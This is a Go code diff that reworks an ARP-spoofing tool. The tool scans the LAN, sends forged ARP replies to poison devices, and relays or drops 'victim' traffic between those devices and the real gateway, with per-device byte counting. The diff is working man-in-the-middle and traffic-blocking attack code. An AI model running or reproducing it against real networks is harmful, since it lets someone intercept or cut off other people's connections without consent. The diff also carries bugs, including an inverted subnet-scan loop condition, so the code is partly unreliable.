@@ -5,8 +5,10 @@ import (
 	"context"
 	"fmt"
 	"log"
+	"math"
 	"net"
 	"os"
+	"slices"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -20,8 +22,6 @@ import (
 
 	"github.com/miekg/dns"
 )
-
-const maxFrame = 1500 + 14
 
 type nameCh struct {
 	name string
@@ -117,11 +117,14 @@ func UnblockDevice(d *Device) {
 }
 
 func blockForwardingForDev(ifaces []string) {
-	SetNetworkForwardState(ifaces, FORWARD_DROP)
+	err := SetNetworkForwardState(ifaces, FORWARD_DROP)
+	if err != nil {
+		log.Fatal(err)
+	}
 	state := GetNetworkForwardState(ifaces)
 	if state != FORWARD_DROP {
 		// panic("forwarding state is not drop: " + state)
-		log.Println("forwarding state is not drop")
+		log.Fatal("forwarding state is not drop")
 	}
 }
 
@@ -147,6 +150,7 @@ func Start(e *Engine) {
 	defer handle.Close()
 
 	ifaces := []string{host.Interface, host.ifaceName}
+	log.Println(ifaces)
 	blockForwardingForDev(ifaces)
 
 	// state := GetNetworkForwardState(ifaces)
@@ -177,8 +181,8 @@ func Start(e *Engine) {
 	go ArpRCV(deviceCh, host, handle, ctx, errChan)
 	go ArpSendRequests(host, handle, ctx, errChan)
 	go ArpSendForgedReplys(ds, host, handle, ctx, errChan)
-	go IpTrafficMonitor(ds, host, ctx, errChan)
 	go Relay(ds, host, ctx, errChan)
+	// go IpTrafficMonitor(ds, host, ctx, errChan)
 
 	for {
 		select {
@@ -191,15 +195,16 @@ func Start(e *Engine) {
 			ds.mu.Lock()
 			hash := createDeviceHash(name.ip, name.mac)
 			dv, ok := ds.Devices[hash]
-			if !ok {
-				log.Println("device not found")
-				continue
+			if ok {
+				dv.Name = name.name
 			}
-			dv.Name = name.name
 			ds.mu.Unlock()
 		case device := <-deviceCh:
 			ds.mu.Lock()
 			ip := device.IP.String()
+			if net.HardwareAddr(device.MAC).String() == net.HardwareAddr(host.MAC).String() {
+				panic(fmt.Sprintf("SELF-POISONED DEVICE:%s %s", device.IP, net.HardwareAddr(host.MAC).String()))
+			}
 			mac := net.HardwareAddr(device.MAC).String()
 			hash := createDeviceHash(ip, mac)
 			if _, ok := ds.Devices[hash]; !ok {
@@ -219,7 +224,22 @@ func Relay(devices DeviceMap, host Device, ctx context.Context, errChan chan err
 		return
 	}
 	defer inactive.CleanUp()
-
+	// NOTE : I am experimenting with diffrenet settings since i don't know alot about them
+	// if err := inactive.SetSnapLen(1600); err != nil {
+	// 	return
+	// }
+	// if err := inactive.SetBufferSize(32 * 1024 * 1024); err != nil { // 32MB ring
+	// 	return
+	// }
+	// if err := inactive.SetPromisc(true); err != nil {
+	// 	return
+	// }
+	// if err := inactive.SetTimeout(50 * time.Millisecond); err != nil {
+	// 	return
+	// }
+	// if err := inactive.SetImmediateMode(false); err != nil {
+	// 	return
+	// }
 	if err := inactive.SetSnapLen(65536); err != nil {
 		return
 	}
@@ -251,88 +271,153 @@ func Relay(devices DeviceMap, host Device, ctx context.Context, errChan chan err
 	}
 
 	packetsCh := gopacket.NewPacketSource(handle, handle.LinkType()).PacketsCtx(ctx)
-
-	for packet := range packetsCh {
-		if ctx.Err() != nil {
+	ticker := time.NewTicker(time.Second * 1)
+	var prevTick int
+	var newtTick int
+	for {
+		if newtTick == math.MaxInt-1 {
+			newtTick, prevTick = 0, 0
+		}
+		select {
+		case <-ctx.Done():
 			return
-		}
+		case <-ticker.C:
+			newtTick++
+		case packet, ok := <-packetsCh:
+			if !ok {
+				return
 
-		data := packet.Data()
-		if len(data) < 34 { // 14 Ethernet + 20 minimal IPv4
-			continue
-		}
-		if net.HardwareAddr(data[6:12]).String() == hostMAC.String() {
-			continue // our own injection, reflected back
-		}
-		capture := packet.Metadata().CaptureInfo
-		if capture.CaptureLength < capture.Length {
-			continue
-		}
-		if len(packet.Data()) > 1514 {
-			continue
-		}
-		ipLayer := packet.Layer(layers.LayerTypeIPv4)
-		if ipLayer == nil {
-			continue
-		}
-		ip4 := ipLayer.(*layers.IPv4)
-		src, dst := ip4.SrcIP, ip4.DstIP
+			}
+			if ctx.Err() != nil {
+				return
+			}
 
-		if src.Equal(hostIP) || dst.Equal(hostIP) {
-			continue // our own traffic
-		}
+			data := packet.Data()
+			if len(data) < 34 { // 14 Ethernet + 20 minimal IPv4
+				continue
+			}
+			if net.HardwareAddr(data[6:12]).String() == hostMAC.String() {
+				continue // our own injection, reflected back
+			}
+			capture := packet.Metadata().CaptureInfo
+			if capture.CaptureLength < capture.Length {
+				continue
+			}
+			if len(packet.Data()) > getMaxFrameLen() {
+				continue
+			}
+			ipLayer := packet.Layer(layers.LayerTypeIPv4)
+			if ipLayer == nil {
+				continue
+			}
+			ip4 := ipLayer.(*layers.IPv4)
+			src, dst := ip4.SrcIP, ip4.DstIP
 
-		nextHop, ok := relayNextHop(devices, src, dst)
-		if !ok || nextHop == nil || nextHop.String() == hostMAC.String() {
-			continue
-		}
+			if src.Equal(hostIP) || dst.Equal(hostIP) {
+				continue // our own traffic
+			}
 
-		copy(data[0:6], nextHop)  // Ethernet dst -> the real next hop
-		copy(data[6:12], hostMAC) // Ethernet src -> us
-		err := handle.WritePacketData(data)
-		if err != nil {
-			log.Println("relay: inject failed:", err)
+			var srcDev, dstDev *Device
+			var nextHop net.HardwareAddr
+
+			bytes := int64(ip4.Length)
+
+			devices.mu.Lock()
+			for _, d := range devices.Devices {
+				shouldTick := false
+				if d.IP.Equal(dst) {
+					dstDev = d
+					d.BytesReceived += bytes
+					shouldTick = true
+				}
+				if d.IP.Equal(src) {
+					srcDev = d
+					d.BytesSent += bytes
+					shouldTick = true
+				}
+				if newtTick > prevTick {
+					if shouldTick {
+						d.tick()
+						prevTick++
+					}
+				}
+			}
+			devices.mu.Unlock()
+
+			// internet/LAN -> victim: deliver straight to the victim.
+			if dstDev != nil {
+				if dstDev.Blocked {
+					continue
+				}
+				nextHop = net.HardwareAddr(dstDev.MAC)
+			}
+
+			// victim -> internet: hand it back to the real gateway.
+			if srcDev != nil {
+				if srcDev.Blocked {
+					continue
+				}
+				gw := gateWay.Load()
+				if gw == nil {
+					continue
+				}
+				nextHop = net.HardwareAddr(gw.mac)
+			}
+
+			// nextHop, ok := relayNextHop(devices, src, dst)
+			if nextHop == nil || nextHop.String() == hostMAC.String() {
+				continue
+			}
+
+			// src := ip.SrcIP
+			// dst := ip.DstIP
+			copy(data[0:6], nextHop)  // Ethernet dst -> the real next hop
+			copy(data[6:12], hostMAC) // Ethernet src -> us
+			err := handle.WritePacketData(data)
+			if err != nil {
+				log.Println("relay: inject failed:", err)
+			}
 		}
 	}
 }
 
-// relayNextHop decides where a transit frame is really headed and returns the
-// MAC of the next hop, or ok=false when the frame is not ours to move.
-func relayNextHop(devices DeviceMap, src, dst net.IP) (net.HardwareAddr, bool) {
-	devices.mu.RLock()
-	var srcDev, dstDev *Device
-	for _, d := range devices.Devices {
-		if d.IP.Equal(dst) {
-			dstDev = d
-		}
-		if d.IP.Equal(src) {
-			srcDev = d
-		}
-	}
-	devices.mu.RUnlock()
+// // relayNextHop decides where a transit frame is really headed and returns the
+// // MAC of the next hop, or ok=false when the frame is not ours to move.
+// func relayNextHop(devices DeviceMap, src, dst net.IP) (net.HardwareAddr, bool) {
+// 	devices.mu.RLock()
+// 	var srcDev, dstDev *Device
+// 	for _, d := range devices.Devices {
+// 		if d.IP.Equal(dst) {
+// 			dstDev = d
+// 		}
+// 		if d.IP.Equal(src) {
+// 			srcDev = d
+// 		}
+// 	}
+// 	devices.mu.RUnlock()
 
-	// internet/LAN -> victim: deliver straight to the victim.
-	if dstDev != nil {
-		if dstDev.Blocked {
-			return nil, false
-		}
-		return net.HardwareAddr(dstDev.MAC), true
-	}
+// 	// internet/LAN -> victim: deliver straight to the victim.
+// 	if dstDev != nil {
+// 		if dstDev.Blocked {
+// 			return nil, false
+// 		}
+// 		return net.HardwareAddr(dstDev.MAC), true
+// 	}
 
-	// victim -> internet: hand it back to the real gateway.
-	if srcDev != nil {
-		if srcDev.Blocked {
-			return nil, false
-		}
-		gw := gateWay.Load()
-		if gw == nil {
-			return nil, false
-		}
-		return gw.mac, true
-	}
+// 	// victim -> internet: hand it back to the real gateway.
+// 	if srcDev != nil {
+// 		if srcDev.Blocked {
+// 			return nil, false
+// 		}
+// 		gw := gateWay.Load()
+// 		if gw == nil {
+// 			return nil, false
+// 		}
+// 		return gw.mac, true
+// 	}
 
-	return nil, false
-}
+// 	return nil, false
+// }
 
 func maxSubnet(host Device) []byte {
 	invertedMask := make(net.IPMask, len(host.Mask.Mask))
@@ -360,17 +445,14 @@ func ArpSendRequests(host Device, handle *pcap.Handle, ctx context.Context, errC
 	//
 	// TODO: should be done ina goroutine with a 5s ticker
 	tk := time.NewTicker(time.Second * 5)
+	gw := gateWay.Load()
 	for {
 		select {
 		case <-ctx.Done():
 			return
 		case <-tk.C:
-			for {
-				if ip.Equal(net.IP(maxSub)) {
-					break
-				}
-
-				if ip.Equal(host.IP) {
+			for ip.Equal(net.IP(maxSub)) {
+				if ip.Equal(host.IP) || slices.ContainsFunc(hostIfacesIp, ip.Equal) || (gw != nil && ip.Equal(gw.ip)) {
 					incrementIP(ip)
 					continue
 				}
@@ -405,15 +487,22 @@ func IpTrafficMonitor(devices DeviceMap, host Device, ctx context.Context, errCh
 	}
 	defer inactive.CleanUp()
 
-	if err := inactive.SetSnapLen(65536); err != nil {
-		return
-	}
+	// const bufBytes =
+	// if err := inactive.SetSnapLen(1600); err != nil {
+	// 	return
+	// }
+	// if err := inactive.SetBufferSize(32 * 1024 * 1024); err != nil { // 32MB ring
+	// 	return
+	// }
 	if err := inactive.SetPromisc(true); err != nil {
 		return
 	}
-	if err := inactive.SetImmediateMode(true); err != nil {
-		return
-	}
+	// if err := inactive.SetTimeout(50 * time.Millisecond); err != nil {
+	// 	return
+	// }
+	// if err := inactive.SetImmediateMode(false); err != nil {
+	// 	return
+	// }
 
 	handle, err := inactive.Activate()
 	if err != nil {
@@ -488,7 +577,13 @@ func ArpSendForgedReplys(devices DeviceMap, host Device, handle *pcap.Handle, ct
 			}
 			// the two loops above
 			devices.mu.RLock()
+			isLocalIp := func(ip net.IP) bool {
+				return slices.ContainsFunc(hostIfacesIp, ip.Equal)
+			}
 			for _, device := range devices.Devices {
+				if isLocalIp(device.IP) {
+					continue
+				}
 				if device.IP.Equal(host.IP) || device.IP.Equal(gw.ip) {
 					continue
 				}
@@ -580,14 +675,14 @@ func ArpRCV(deviceCh chan *Device, host Device, handle *pcap.Handle, ctx context
 
 			deviceCh <- device
 			// TODO: remove this
-			fmt.Printf(
-				"ARP: %s (%s) -> %s (%s), op=%d\n",
-				device.IP.String(),
-				net.HardwareAddr(device.MAC).String(),
-				net.IP(arp.DstProtAddress).String(),
-				net.HardwareAddr(arp.DstHwAddress).String(),
-				arp.Operation,
-			)
+			// fmt.Printf(
+			// 	"ARP: %s (%s) -> %s (%s), op=%d\n",
+			// 	device.IP.String(),
+			// 	net.HardwareAddr(device.MAC).String(),
+			// 	net.IP(arp.DstProtAddress).String(),
+			// 	net.HardwareAddr(arp.DstHwAddress).String(),
+			// 	arp.Operation,
+			// )
 		}
 		select {
 		case <-ctx.Done():
@@ -623,7 +718,7 @@ func getVendor(mac string) string {
 }
 
 // TODO: start a goroutine to resolve the name with lookup addr, mdns, llmnr ..etc, and listen for changes later
-func getDeviceName(nameChane chan nameCh, ip string, mac string) {
+func getDeviceName(nameChan chan nameCh, ip string, mac string) {
 	var name string
 	names, err := net.LookupAddr(ip)
 	if err == nil && len(names) > 0 {
@@ -634,12 +729,14 @@ func getDeviceName(nameChane chan nameCh, ip string, mac string) {
 		name = "Unknown"
 
 	}
-	nameChane <- nameCh{name: name, ip: ip, mac: mac}
+	nameChan <- nameCh{name: name, ip: ip, mac: mac}
 	// if name, err := reverseMDN(ip); err == nil {
 	// 	d.Name = name
 	// 	return
 	// }
 }
+
+var hostIfacesIp []net.IP
 
 func reverseMDNS(ip string) (string, error) {
 	addr := net.ParseIP(ip).To4()
@@ -821,6 +918,7 @@ func getHost() Device {
 	for _, iface := range ifs {
 		log.Println("ifs", stringIface(iface))
 		for _, addr := range iface.Addresses {
+			hostIfacesIp = append(hostIfacesIp, addr.IP)
 			if addr.IP.Equal(host.IP) {
 				host.Interface = iface.Name
 				host.Mask.MaskIP = net.IP(addr.Netmask)
